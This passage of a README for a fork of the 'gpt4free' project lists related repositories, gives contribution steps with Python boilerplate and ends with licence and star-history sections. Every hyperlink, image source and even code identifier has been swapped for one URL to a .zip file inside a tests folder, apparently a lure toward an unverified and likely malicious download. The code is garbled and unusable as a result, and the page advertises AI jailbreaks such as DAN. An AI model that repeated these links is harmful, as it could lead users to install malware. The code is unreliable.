      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><img alt="Stars" src="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"/></a></td>
      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><img alt="Forks" src="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"/></a></td>
      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><img alt="Issues" src="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"/></a></td>
      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><img alt="Pull Requests" src="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"/></a></td>
    </tr>
    <tr>
      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><b>gpt4free-ts</b></a></td>
      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><img alt="Stars" src="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"/></a></td>
      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><img alt="Forks" src="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"/></a></td>
      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><img alt="Issues" src="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"/></a></td>
      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><img alt="Pull Requests" src="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"/></a></td>
    </tr>
    <tr>
      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><b>ChatGPT-Clone</b></a></td>
      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><img alt="Stars" src="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"/></a></td>
      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><img alt="Forks" src="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"/></a></td>
      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><img alt="Issues" src="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"/></a></td>
      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><img alt="Pull Requests" src="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"/></a></td>
    </tr>
    <tr>
      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><b>ChatGpt Discord Bot</b></a></td>
      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><img alt="Stars" src="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"/></a></td>
      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><img alt="Forks" src="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"/></a></td>
      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><img alt="Issues" src="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"/></a></td>
      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><img alt="Pull Requests" src="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"/></a></td>
    </tr>
    <tr>
      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><b>LangChain gpt4free</b></a></td>
      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><img alt="Stars" src="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"/></a></td>
      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><img alt="Forks" src="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"/></a></td>
      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><img alt="Issues" src="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"/></a></td>
      <td><a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"><img alt="Pull Requests" src="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip"/></a></td>
    </tr>
  </tbody>
</table>

## Contribute

to add another provider, its very simple:
1. create a new file in [g4f/Provider/Providers](./g4f/Provider/Providers) with the name of the Provider
2. in the file, paste the *Boilerplate* you can find in [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip): 

```py
import os
from https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip import sha256, Dict, get_type_hints

url = None
model = None
supports_stream = False
needs_auth = False

def _create_completion(model: str, messages: list, stream: bool, **kwargs):
    return


params = f'https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip{https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip(__file__)[:-3]} supports: ' + \
    '(%s)' % ', '.join(
        [f"{name}: {get_type_hints(_create_completion)[name].__name__}" for name in https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip[https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip]])

```

3. Here, you can adjust the settings, for example if the website does support streaming, set `supports_stream` to `True`...
4. Write code to request the provider in `_create_completion` and `yield` the response, *even if* its a one-time response, do not hesitate to look at other providers for inspiration
5. Add the Provider Name in [https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip)

```py
from . import Provider
from .Providers import (
    ...,
    ProviderNameHere
)
```

6. You are done !, test the provider by calling it:
```py
import g4f

response = https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip(model='gpt-3.5-turbo', https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip,
                                    messages=[{"role": "user", "content": "test"}], https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip)

for message in response:
    print(message, flush=True, end='')
```

## ChatGPT clone

> Currently implementing new features and trying to scale it, please be patient it may be unstable  
> https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip
> This site was developed by me and includes **gpt-4/3.5**, **internet access** and **gpt-jailbreak's** like DAN  
> Run locally here: https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip

## Copyright:

This program is licensed under the [GNU GPL v3](https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip)

## Copyright Notice:

```
xtekky/gpt4free: Copyright (C) 2023 xtekky

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip>.
```


## Star History

<a href="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip">
        <img width="500" alt="Star History Chart" src="https://raw.githubusercontent.com/adiab1511/gpt4free/main/g4f/.v1/gpt4free/quora/tests/free_gpt_Syryenian.zip">
      </a> 
